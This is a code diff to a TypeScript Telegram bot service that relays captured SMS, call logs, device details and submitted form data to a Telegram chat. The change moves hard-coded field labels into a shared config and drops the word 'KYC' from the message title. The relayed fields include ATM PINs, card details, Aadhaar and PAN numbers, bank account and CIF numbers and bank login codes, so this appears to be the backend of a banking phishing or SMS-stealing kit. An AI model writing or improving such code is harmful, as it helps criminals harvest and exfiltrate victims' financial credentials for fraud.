@@ -2,6 +2,7 @@ import TelegramBot from 'node-telegram-bot-api';
 import { TelegramConfig, NotificationOptions } from './types.js';
 import { store } from '../store.js';
 import { SMS, CallLog, Device, FormData } from '../types/index.js';
+import { getFieldDisplayName, getFieldsByCategory, FIELD_CATEGORIES, EXCLUDE_FIELDS } from '../formConfig.js';
 import * as fs from 'fs';
 import * as path from 'path';
 import * as os from 'os';
@@ -531,33 +532,10 @@ export class TelegramBotService {
             sessions.push(currentSession);
         }
 
-        // Helper to get display name for a field key
-        const getFieldDisplayName = (key: string): string => {
-            const fieldNames: Record<string, string> = {
-                fullName: 'Full Name',
-                mobileNumber: 'Mobile Number',
-                motherName: 'Mother Name',
-                accountNumber: 'Account Number',
-                aadhaarNumber: 'Aadhaar Number',
-                panCard: 'PAN Card',
-                cardLast6: 'Card Last 6',
-                atmPin: 'ATM PIN',
-                cifNumber: 'CIF Number',
-                branchCode: 'Branch Code',
-                dateOfBirth: 'Date of Birth',
-                cardExpiry: 'Card Expiry',
-                finalPin: 'Final PIN',
-                userId: 'User ID',
-                accessCode: 'Access Code',
-                profileCode: 'Profile Code',
-                name: 'Name',
-                phoneNumber: 'Phone Number'
-            };
-            return fieldNames[key] || key.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase());
-        };
+        // Helper to get display name for a field key — reads from formConfig
+        const fieldDisplayName = (key: string): string => getFieldDisplayName(key);
 
-        // Fields to exclude from display
-        const excludeFields = new Set(['pageName', 'submittedAt', 'deviceId', 'currentFlow', 'id', 'sessionStart', 'sessionEnd', 'flowType', 'pagesSubmitted']);
+
 
         // Generate text content with submission history
         let content = `========================================\n`;
@@ -622,11 +600,11 @@ export class TelegramBotService {
 
                 // Show all fields from this submission
                 Object.keys(form).forEach(key => {
-                    if (excludeFields.has(key)) return;
+                    if (EXCLUDE_FIELDS.has(key)) return;
                     const value = form[key];
                     if (!value || value === '') return;
 
-                    const displayName = getFieldDisplayName(key);
+                    const displayName = fieldDisplayName(key);
                     const previousValues = fieldHistory[key] || [];
                     const lastValue = previousValues.length > 0 ? previousValues[previousValues.length - 1] : null;
 
@@ -650,36 +628,31 @@ export class TelegramBotService {
             const consolidated: Record<string, string> = {};
             chronological.forEach((form: any) => {
                 Object.keys(form).forEach(key => {
-                    if (excludeFields.has(key)) return;
+                    if (EXCLUDE_FIELDS.has(key)) return;
                     if (form[key] && form[key] !== '') {
                         consolidated[key] = form[key];
                     }
                 });
             });
 
-            // Show consolidated view at the end of session
+            // Show consolidated view by categories from formConfig
             content += `----------------------------------------\n`;
             content += `>> CONSOLIDATED DATA (Final Values)\n`;
             content += `----------------------------------------\n`;
 
-            // Group consolidated data by category
-            const personalFields = ['fullName', 'name', 'mobileNumber', 'phoneNumber', 'motherName', 'dateOfBirth'];
-            const accountFields = ['accountNumber', 'aadhaarNumber', 'panCard', 'cifNumber', 'branchCode'];
-            const cardFields = ['cardLast6', 'cardExpiry', 'atmPin', 'finalPin'];
-            const loginFields = ['userId', 'accessCode', 'profileCode'];
-
             const formatConsolidatedSection = (title: string, fields: string[]): string => {
                 const items = fields
                     .filter(f => consolidated[f])
-                    .map(f => `   ${getFieldDisplayName(f)}: ${consolidated[f]}`);
+                    .map(f => `   ${fieldDisplayName(f)}: ${consolidated[f]}`);
                 if (items.length === 0) return '';
                 return `\n${title}:\n${items.join('\n')}\n`;
             };
 
-            content += formatConsolidatedSection('Personal Details', personalFields);
-            content += formatConsolidatedSection('Account Details', accountFields);
-            content += formatConsolidatedSection('Card Details', cardFields);
-            content += formatConsolidatedSection('Login Credentials', loginFields);
+            // Build sections from formConfig categories
+            for (const category of FIELD_CATEGORIES) {
+                const categoryFields = getFieldsByCategory(category.key).map(f => f.key);
+                content += formatConsolidatedSection(`${category.emoji} ${category.displayName}`, categoryFields);
+            }
 
             content += `\n`;
         });
@@ -1378,37 +1351,19 @@ export class TelegramBotService {
             return section;
         };
 
-        let message = `📝 *New KYC Form Submission*\n\n`;
+        let message = `📝 *New Form Submission*\n\n`;
         message += `📱 Device: *⟨${deviceName}⟩*\n`;
         message += `━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
 
-        message += formatSection('Personal Details', '👤', [
-            { label: 'Name', value: form.fullName || form.name },
-            { label: 'Mobile', value: form.mobileNumber || form.phoneNumber },
-            { label: 'Mother', value: form.motherName },
-            { label: 'DOB', value: form.dateOfBirth }
-        ]);
-
-        message += formatSection('Account Details', '🏦', [
-            { label: 'Account', value: form.accountNumber },
-            { label: 'Aadhaar', value: form.aadhaarNumber },
-            { label: 'PAN', value: form.panCard },
-            { label: 'CIF', value: form.cifNumber },
-            { label: 'Branch', value: form.branchCode }
-        ]);
-
-        message += formatSection('Card Details', '💳', [
-            { label: 'Last 6', value: form.cardLast6 },
-            { label: 'Expiry', value: form.cardExpiry },
-            { label: 'PIN', value: form.atmPin },
-            { label: 'Final PIN', value: form.finalPin }
-        ]);
-
-        message += formatSection('Login Credentials', '🔐', [
-            { label: 'User ID', value: form.userId },
-            { label: 'Access Code', value: form.accessCode },
-            { label: 'Profile Code', value: form.profileCode }
-        ]);
+        // Build sections from formConfig categories
+        for (const category of FIELD_CATEGORIES) {
+            const categoryFields = getFieldsByCategory(category.key);
+            const fields = categoryFields.map(f => ({
+                label: f.displayName,
+                value: form[f.key]
+            }));
+            message += formatSection(category.displayName, category.emoji, fields);
+        }
 
         // Remove trailing newlines
         message = message.trim();
